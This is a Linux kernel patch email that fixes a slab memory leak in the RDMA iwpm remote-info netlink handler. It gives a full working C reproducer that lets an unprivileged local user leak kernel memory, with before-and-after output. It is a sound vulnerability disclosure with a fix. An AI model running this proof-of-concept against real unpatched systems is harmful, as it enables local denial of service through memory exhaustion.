Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=74.125.82.174
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1794254618;
	b=MOGAhxpflAhr3X4IqGN11HiZ8wFRNCHdIrmxWY5V/Xtz16HiNPG1DGEuF6zYyhkJvTLc
	 2I4dF4PT3nG7nyengOE9opEruOdCSOJxrkItYHnDq8Ek+P9ElIVc3JJaTC7G7bYp5ItLD
	 oVgUZMDhJ1UGJaSkdXclR5DISyBlrh9YRqipiaEqZbRzg6WXF8jnT5UlkW+MScXpE3dXc
	 HOjj+US9qZLzIkLWJU2quUwWjnqqt6aoEBNmU6C7I3iGyS9/WMFRyo7glURDVQOl2oYqP
	 HLsEMjYYiBMmjIXiDEMddB51hh+IzmRzI9hFU0Y61adh8Do4WaYuBzOYatjDOuqUHIQ==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794254618;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
	 Content-Transfer-Encoding;
	bh=F7qtiYhq//Oa4yRKIVkAkJ2ybO07p3S5cPop3tivl6w=;
	b=o5f/gXbw98H9iktcZyOqFiCmmph1scX1LGqRPYp/+a5pKSyqzhtrpvr2aruUkvAXaPlr
	 1HJx06ADR4I6r+AW1+egLD+MvzYEZJ5CokhtvN/bkYwM6emopmYwTb1Mike6/G87HTHdc
	 u83EPJI1iO6sgmMshFyO7PYFNnqWJENySpkBBUvsVa5KJ+pleB36eFLDwiaGgQzzcX/gq
	 BdZLvCRDO+2s+71x2HwVZOEL8mnKoYewkkg49n0XoRe0q7spB+3u01eEG2uIGteUp08BF
	 trmnYl1yok5mj8bFMv0/t+uugilv+WiPQ08hbbHsMd5AgGXyVDtM33KWkMttthzL1DA==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=gmail.com;
	spf=pass smtp.mailfrom=gmail.com;
	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=GIYVFuuO;
	arc=none smtp.remote-ip=74.125.82.174
Received: from mail-dy1-f174.google.com (mail-dy1-f174.google.com [74.125.82.174])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DAB8B60A2607
	for <linux-rdma@vger.kernel.org>; Mon,  9 Nov 2026 20:03:37 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org DAB8B60A2607
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=GIYVFuuO
Received: by mail-dy1-f174.google.com with SMTP id 5a478bee46e88-36fc0a3fe93so2519818eec.0
        for <linux-rdma@vger.kernel.org>; Mon, 09 Nov 2026 12:03:37 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20260707; t=1794254617; x=1794859417; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=F7qtiYhq//Oa4yRKIVkAkJ2ybO07p3S5cPop3tivl6w=;
        b=GIYVFuuO/k6UZzcBy6BcZr4r1LZ+SW4FNzRdMs8bSVKhIhP1UJU8xNHSFhTuR6baHn
         e+/Wdnrpv7kC7udPW3hnihuJ04ZV6fRcr6WMD0n/hSoFhzOGJVXHuyJquoVriDhGB/gJ
         E5GCY+WweW8lrx3FqHgcg37yyrje6XLCfoK2eltc+LOZW0FBkdFgcPNwZhB0W/QEPB2P
         GfNp22XhlxSHvZQG+G2p0GDTDnNlPkfkvNTtxL71Sk5TtgasMwgd6e9+CRNcTvoIvfht
         f180Y5ZAIYWUDMgr03bCpeEbq0kxq/HfcT3UIgYuonwtOgdKVuJ6Agt1kjM4IG1deCR0
         cVQg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1794254617; x=1794859417;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=F7qtiYhq//Oa4yRKIVkAkJ2ybO07p3S5cPop3tivl6w=;
        b=uPknIEmfabC1pTJER1Y5Vq3TDlJeMcqy22NO9lk3+9sGMlrjPBQoM9a2Hi0txar+O8
         uQI1o5Q/N2uHBdEV1FMWxkm5Q3QK8JMvygrl5a8UAcm3azdGI+aoA9vuPf+nD3XFyukO
         My8ScfV+AJYnw8/YDJNhUmly71U0OXws+ol8d2JdIA0e0y9sCevFmUlLBJYZU6aKLOsp
         0vmejJEUamdqxRmuvaR11UnpFbjQJuIDqJWIKsGbx99kk/d03924/+6rzFuPiO9Yqf5b
         I46FW9L932QhgkaifzHJX+ybEO1j5FFDSKl0/Tj91nUrczSEkiE13liHls8mohcv5Jn5
         Fvow==
X-Forwarded-Encrypted: i=1; AL+hErHQhSGea8G/DQ0Fdnc5s9AqCdyS7nQN1ufa0yAUWs7jI1/ztMar2YUixO44j0aDzWkUlpeqiM9sqnzG@vger.kernel.org
X-Gm-Message-State: APuU4Z9Y5Lp03dJXH9ONNWTdYJZ76LMhKvkp5WBTlHnpxZR6n+vh/DOL
	TxGa+fbNHf4USdW3SQp26tgjEhIHZRhkFfYuGQLAPIpWRuWFCIai1vuk
X-Gm-Gg: AYBFou2xAWMJZKgumw0Eb+zu7qPHgNJuyVR+9hhQFUcUjCWI/n8zotr6vOtHey9P/k1
	E7px1PCQn05vB70ju/aYGvyAXz6f5q3ZMzg0NMo6nQzCxTvmDq6mf7E9JtrrJoeXLb+2/xn9MFL
	wlhZ7tTe2DeLjkBuqNZxeg4cx0c3WW/muTGReRIiykVBC9cHYg/umd9kzqV8XI8wbat7RaP90QJ
	xX3IMK4ZOb5R+7iI6gUc+HA9erei4S7gOQG2/D6IJLmhxvDu6RNJhVaXfPMtCz1ZcW+XBziXkcm
	RTXvvme7CUmVzTLYcdB8WrrvnEZxVB6S21WTaUzVaZT/HbZvJIDTbTQr5VDB7VeqdtgdE9XiRFv
	gtLvmWC02QM9XLrgg70iB3qoQOR/wydGd7+hGpFZxdJ5PovOffpg0GlOqbJU2iu/ffe/nYJJ3jV
	vEc+36xaDdO+UxRBbpyvk4C/ODP0tVOna9fRDGsI2BM8te8eEZroIXJj5aXc+u2+XJAJIStZ0TW
	/5IYudKocNoO1oYEhU0rxlonSnvPIqlZUoFNViKxkAUAqePJdT2Y2re9oDk31u8ElYuWrbB70r6
	tMFgFt+Oh0D6YLgk573Q2vq6moMRUneRHGI2bfuUjqqxkRwvsFeOmpbu7JmalabjPFwdrag=
X-Received: by 2002:a05:7300:105:b0:35e:da0a:75b0 with SMTP id 5a478bee46e88-3751f560557mr359081eec.25.1794254616749;
        Mon, 09 Nov 2026 12:03:36 -0800 (PST)
Received: from localhost.localdomain ([112.170.44.210])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-37520cfe07dsm562497eec.20.2026.11.09.12.03.34
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 09 Nov 2026 12:03:36 -0800 (PST)
From: Junyoung Jang <graypanda.inzag@gmail.com>
To: Jason Gunthorpe <jgg@ziepe.ca>,
	Leon Romanovsky <leon@kernel.org>
Cc: Junyoung Jang <graypanda.inzag@gmail.com>,
	Jeffin Philip <jeffinphilip14@gmail.com>,
	linux-rdma@vger.kernel.org,
	linux-kernel@vger.kernel.org
Subject: [PATCH] RDMA/iwpm: fix memory leak in iwpm_add_remote_info()
Date: Tue, 10 Nov 2026 05:03:28 +0900
Message-ID: <20261109200330.2361828-1-graypanda.inzag@gmail.com>
X-Mailer: git-send-email 2.43.0
X-Mailing-List: linux-rdma@vger.kernel.org
List-Id: <linux-rdma.vger.kernel.org>
List-Post: <mailto:linux-rdma@vger.kernel.org>
List-Help: <mailto:linux-rdma+help@vger.kernel.org>
List-Subscribe: <mailto:linux-rdma+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-rdma+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-rdma+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

NETLINK_RDMA accepts requests addressed to kernel port ID 0 from a local
unprivileged socket. The IWCM RDMA_NL_IWPM_REMOTE_INFO callback has no
RDMA_NL_ADMIN_PERM flag, and RDMA netlink routes this IWCM opcode to its
dump callback even without NLM_F_DUMP.

iwpm_remote_info_cb() parses the six required attributes and only checks
that the local and mapped-local sockaddr_storage families match and that
the remote and mapped-remote families match. Four family-255 addresses
pass those checks. The callback allocates an iwpm_remote_info object
with GFP_ATOMIC and passes it to iwpm_add_remote_info(). There,
get_reminfo_hash_bucket() accepts only AF_INET and AF_INET6, so the
family-255 lookup returns NULL. The object is neither linked into
iwpm_reminfo_bucket nor freed, and the callback returns -EINVAL after
this allocation side effect.

iwpm_exit() only walks and frees linked hash entries, so closing the
netlink socket does not recover these orphaned objects. As a result, an
unprivileged local user in the initial network namespace can repeatedly
send this request without CAP_NET_ADMIN to permanently leak unreclaimable
kernel slab memory (kmalloc-512), leading to memory exhaustion and a
denial of service (DoS).

Initialize hash_bucket_head to NULL and, after the spinlock is released,
free rem_info if no bucket accepted it. Freeing after unlock also covers
the absent-table case without changing the protected list operation and
follows the existing null-bucket cleanup pattern in iwpm_add_mapinfo().

Fixes: 6eec17746175 ("RDMA/core: Enable the iWarp Port Mapper to provide the actual address of the connecting peer to its clients")
Signed-off-by: Junyoung Jang <graypanda.inzag@gmail.com>
---
Note: This patch addresses the unsupported-family orphan leak. A separate
valid-AF_INET route can insert duplicate remote-info entries without a
per-sender limit (as RDMA_NL_IWPM_REMOTE_INFO lacks RDMA_NL_ADMIN_PERM);
that growth can be addressed in a follow-up patch if desired.

Reproducer output on unpatched kernel (7.4.0-rc1):

    # kmalloc-512 before: active=801 total=816 size=512
    $ ./iwpm-remote-info-leak 1024 --control
    uid=1000
    mode=no-callback-control
    rounds=1024
    sunreclaim_before_kb=6672
    first_reply_type=2
    first_reply_len=580
    first_reply_status=-22
    sent=1024
    recv_count=1024
    sunreclaim_after_close_kb=6672
    sunreclaim_delta_close_kb=0
    sunreclaim_after_1s_kb=6684
    sunreclaim_delta_1s_kb=12
    # kmalloc-512 after control: active=801 total=816 size=512

    $ ./iwpm-remote-info-leak 1024
    uid=1000
    mode=unsupported-family
    rounds=1024
    sunreclaim_before_kb=6684
    first_reply_type=3
    first_reply_len=20
    first_reply_status=-22
    sent=1024
    recv_count=1024
    sunreclaim_after_close_kb=7188
    sunreclaim_delta_close_kb=504
    sunreclaim_after_1s_kb=7188
    sunreclaim_delta_1s_kb=504
    # kmalloc-512 after unsupported-family: active=1809 total=1824 size=512

Reproducer output on patched kernel (7.4.0-rc1 + this patch):

    # kmalloc-512 before: active=801 total=816 size=512
    $ ./iwpm-remote-info-leak 1024 --control
    uid=1000
    mode=no-callback-control
    rounds=1024
    sunreclaim_before_kb=6632
    first_reply_type=2
    first_reply_len=580
    first_reply_status=-22
    sent=1024
    recv_count=1024
    sunreclaim_after_close_kb=6632
    sunreclaim_delta_close_kb=0
    sunreclaim_after_1s_kb=6644
    sunreclaim_delta_1s_kb=12
    # kmalloc-512 after control: active=801 total=816 size=512

    $ ./iwpm-remote-info-leak 1024
    uid=1000
    mode=unsupported-family
    rounds=1024
    sunreclaim_before_kb=6644
    first_reply_type=3
    first_reply_len=20
    first_reply_status=-22
    sent=1024
    recv_count=1024
    sunreclaim_after_close_kb=6644
    sunreclaim_delta_close_kb=0
    sunreclaim_after_1s_kb=6644
    sunreclaim_delta_1s_kb=0
    # kmalloc-512 after unsupported-family: active=801 total=816 size=512

Reproducer (iwpm-remote-info-leak.c):

/* SPDX-License-Identifier: GPL-2.0-only */
#define _GNU_SOURCE
#include <errno.h>
#include <inttypes.h>
#include <linux/netlink.h>
#include <poll.h>
#include <rdma/rdma_netlink.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

/*
 * Exercise the IWPM remote-info callback with a complete netlink message
 * whose four sockaddr_storage values share an unsupported address family.
 * The --control mode sends the same attributes to an opcode with no callback.
 * Run in the initial network namespace of a disposable test kernel.
 */
#define MAX_ROUNDS 4096
#define REPLY_TIMEOUT_MS 3000

_Static_assert(sizeof(struct sockaddr_storage) == 128,
	       "IWPM expects 128-byte sockaddr_storage attributes");

static void fail(const char *what)
{
	fprintf(stderr, "%s: %s\n", what, strerror(errno));
	exit(EXIT_FAILURE);
}

static unsigned long long sunreclaim_kb(void)
{
	char line[256];
	unsigned long long value;
	FILE *file = fopen("/proc/meminfo", "r");

	if (!file)
		fail("fopen /proc/meminfo");
	while (fgets(line, sizeof(line), file)) {
		if (sscanf(line, "SUnreclaim: %llu kB", &value) == 1) {
			if (fclose(file))
				fail("fclose /proc/meminfo");
			return value;
		}
	}
	if (ferror(file))
		fail("read /proc/meminfo");
	fclose(file);
	fputs("SUnreclaim is missing from /proc/meminfo\n", stderr);
	exit(EXIT_FAILURE);
}

static size_t add_attr(unsigned char *buf, size_t capacity, size_t offset,
		       unsigned short type, const void *data, size_t data_len)
{
	size_t length = NLA_HDRLEN + data_len;
	size_t aligned = NLA_ALIGN(length);
	struct nlattr *attr;

	if (offset > capacity || aligned > capacity - offset || length > UINT16_MAX) {
		fputs("request attribute buffer too small\n", stderr);
		exit(EXIT_FAILURE);
	}
	attr = (struct nlattr *)(buf + offset);
	attr->nla_type = type;
	attr->nla_len = length;
	memcpy((unsigned char *)attr + NLA_HDRLEN, data, data_len);
	return offset + aligned;
}

static size_t make_request(unsigned char *buf, size_t capacity,
			   uint32_t sequence, bool control)
{
	struct sockaddr_storage address = { .ss_family = 255 };
	struct nlmsghdr *header = (struct nlmsghdr *)buf;
	uint16_t error = 0;
	unsigned int opcode = control ? RDMA_NL_IWPM_REMOVE_MAPPING :
					RDMA_NL_IWPM_REMOTE_INFO;
	size_t offset = NLMSG_HDRLEN;

	memset(buf, 0, capacity);
	offset = add_attr(buf, capacity, offset, IWPM_NLA_RQUERY_MAPPING_SEQ,
			  &sequence, sizeof(sequence));
	offset = add_attr(buf, capacity, offset, IWPM_NLA_RQUERY_LOCAL_ADDR,
			  &address, sizeof(address));
	offset = add_attr(buf, capacity, offset, IWPM_NLA_RQUERY_REMOTE_ADDR,
			  &address, sizeof(address));
	offset = add_attr(buf, capacity, offset, IWPM_NLA_RQUERY_MAPPED_LOC_ADDR,
			  &address, sizeof(address));
	offset = add_attr(buf, capacity, offset, IWPM_NLA_RQUERY_MAPPED_REM_ADDR,
			  &address, sizeof(address));
	offset = add_attr(buf, capacity, offset, IWPM_NLA_RQUERY_MAPPING_ERR,
			  &error, sizeof(error));
	header->nlmsg_len = offset;
	header->nlmsg_type = RDMA_NL_GET_TYPE(RDMA_NL_IWCM, opcode);
	header->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	header->nlmsg_seq = sequence;
	return offset;
}

static void receive_reply(int fd, uint32_t sequence, int expected_type,
			  unsigned int *reply_count, bool first)
{
	unsigned char buf[2048];
	struct pollfd pfd = { .fd = fd, .events = POLLIN };
	bool matched = false;

	while (!matched) {
		int ready;
		ssize_t length;
		int remaining;
		struct nlmsghdr *header;

		do {
			ready = poll(&pfd, 1, REPLY_TIMEOUT_MS);
		} while (ready < 0 && errno == EINTR);
		if (ready < 0)
			fail("poll NETLINK_RDMA");
		if (ready == 0) {
			fprintf(stderr, "no reply for sequence %u\n", sequence);
			exit(EXIT_FAILURE);
		}
		do {
			length = recv(fd, buf, sizeof(buf), 0);
		} while (length < 0 && errno == EINTR);
		if (length < 0)
			fail("recv NETLINK_RDMA");
		remaining = length;
		for (header = (struct nlmsghdr *)buf;
		     NLMSG_OK(header, remaining);
		     header = NLMSG_NEXT(header, remaining)) {
			int status;

			(*reply_count)++;
			if (header->nlmsg_seq != sequence)
				continue;
			if (header->nlmsg_type != expected_type)
				continue;
			if (header->nlmsg_len < NLMSG_LENGTH(sizeof(status))) {
				fputs("short netlink reply\n", stderr);
				exit(EXIT_FAILURE);
			}
			memcpy(&status, NLMSG_DATA(header), sizeof(status));
			if (first) {
				printf("first_reply_type=%u\n", header->nlmsg_type);
				printf("first_reply_len=%u\n", header->nlmsg_len);
				printf("first_reply_status=%d\n", status);
			}
			if (status != -EINVAL) {
				fprintf(stderr, "unexpected reply status %d\n", status);
				exit(EXIT_FAILURE);
			}
			matched = true;
		}
		if (remaining) {
			fputs("malformed netlink reply\n", stderr);
			exit(EXIT_FAILURE);
		}
	}
}

int main(int argc, char **argv)
{
	struct sockaddr_nl kernel = { .nl_family = AF_NETLINK };
	unsigned char request[576];
	unsigned long parsed;
	unsigned int rounds, replies = 0;
	unsigned long long before, after, later;
	bool control = false;
	char *end;
	int fd;

	if (argc < 2 || argc > 3) {
		fprintf(stderr, "usage: %s ROUNDS [--control]\n", argv[0]);
		return 2;
	}
	errno = 0;
	parsed = strtoul(argv[1], &end, 10);
	if (errno || !*argv[1] || *end || !parsed || parsed > MAX_ROUNDS) {
		fprintf(stderr, "ROUNDS must be between 1 and %d\n", MAX_ROUNDS);
		return 2;
	}
	if (argc == 3) {
		if (strcmp(argv[2], "--control")) {
			fprintf(stderr, "usage: %s ROUNDS [--control]\n", argv[0]);
			return 2;
		}
		control = true;
	}
	rounds = parsed;
	printf("uid=%u\nmode=%s\nrounds=%u\n", (unsigned int)getuid(),
	       control ? "no-callback-control" : "unsupported-family", rounds);
	before = sunreclaim_kb();
	printf("sunreclaim_before_kb=%llu\n", before);
	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_RDMA);
	if (fd < 0)
		fail("socket NETLINK_RDMA");
	for (uint32_t i = 1; i <= rounds; i++) {
		size_t length = make_request(request, sizeof(request), i, control);
		ssize_t sent;

		do {
			sent = sendto(fd, request, length, 0,
				      (struct sockaddr *)&kernel, sizeof(kernel));
		} while (sent < 0 && errno == EINTR);
		if (sent < 0)
			fail("sendto NETLINK_RDMA");
		if ((size_t)sent != length) {
			fputs("short netlink send\n", stderr);
			return EXIT_FAILURE;
		}
		receive_reply(fd, i, control ? NLMSG_ERROR : NLMSG_DONE,
			      &replies, i == 1);
	}
	printf("sent=%u\nrecv_count=%u\n", rounds, replies);
	if (close(fd))
		fail("close NETLINK_RDMA");
	after = sunreclaim_kb();
	printf("sunreclaim_after_close_kb=%llu\n", after);
	printf("sunreclaim_delta_close_kb=%lld\n",
	       (long long)after - (long long)before);
	sleep(1);
	later = sunreclaim_kb();
	printf("sunreclaim_after_1s_kb=%llu\n", later);
	printf("sunreclaim_delta_1s_kb=%lld\n",
	       (long long)later - (long long)before);
	return EXIT_SUCCESS;
}

 drivers/infiniband/core/iwpm_util.c | 5 ++++-
 1 file changed, 4 insertions(+), 1 deletion(-)

diff --git a/drivers/infiniband/core/iwpm_util.c b/drivers/infiniband/core/iwpm_util.c
index 51af8c1c49f9..215f70cfd113 100644
--- a/drivers/infiniband/core/iwpm_util.c
+++ b/drivers/infiniband/core/iwpm_util.c
@@ -236,7 +236,7 @@ static struct hlist_head *get_reminfo_hash_bucket(struct sockaddr_storage *,
 
 void iwpm_add_remote_info(struct iwpm_remote_info *rem_info)
 {
-	struct hlist_head *hash_bucket_head;
+	struct hlist_head *hash_bucket_head = NULL;
 	unsigned long flags;
 
 	spin_lock_irqsave(&iwpm_reminfo_lock, flags);
@@ -248,6 +248,9 @@ void iwpm_add_remote_info(struct iwpm_remote_info *rem_info)
 			hlist_add_head(&rem_info->hlist_node, hash_bucket_head);
 	}
 	spin_unlock_irqrestore(&iwpm_reminfo_lock, flags);
+
+	if (!hash_bucket_head)
+		kfree(rem_info);
 }
 
 /**
-- 
2.43.0
